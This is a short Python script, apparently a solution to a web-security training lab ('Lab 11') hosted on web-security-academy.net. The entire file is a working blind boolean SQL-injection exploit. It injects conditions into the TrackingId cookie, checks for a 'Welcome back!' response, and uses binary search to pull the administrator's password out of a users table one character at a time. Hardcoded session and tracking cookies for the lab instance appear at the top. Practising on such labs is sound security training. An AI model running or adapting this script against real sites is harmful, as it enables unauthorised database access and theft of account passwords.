# Lab 11

import requests
import urllib3

urllib3.disable_warnings()

TARGET_URL = "https://0a4900d00431f497808a2bb6003e001c.web-security-academy.net/"
SESSION_COOKIE = "m31n09RVe7tnQMYJpJaQWpW36CwMnYQS"
TRACKING_ID = "c7PzKdDqY6hmOTwA"

MAX_LEN = 30


def send_payload(payload):
    cookies = {
        "TrackingId": TRACKING_ID + payload,
        "session": SESSION_COOKIE
    }

    r = requests.get(TARGET_URL, cookies=cookies, verify=False)
    return "Welcome back!" in r.text


def check_position_exists(pos):
    payload = f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator') >= {pos}-- "
    return send_payload(payload)


def get_char(position):
    low = 48
    high = 122

    while low <= high:
        mid = (low + high) // 2
        print(f"mid: {mid}")
        payload = f"' AND (SELECT ASCII(SUBSTRING(password,{position},1)) FROM users WHERE username='administrator') > {mid}-- "

        if send_payload(payload):
            low = mid + 1
        else:
            high = mid - 1
    print(f"low: {low}, high: {high}")
    return chr(low)


print("[*] Dumping password with binary search...")

password = ""

for i in range(1, MAX_LEN + 1):

    print(f"position: {check_position_exists(i)}")
    if not check_position_exists(i):
        print("[*] End of password")
        break

    char = get_char(i)
    print(f"char: {char}")
    password += char
    print(f"[+] {i}: {char}")

print(f"\n PASSWORD: {password}")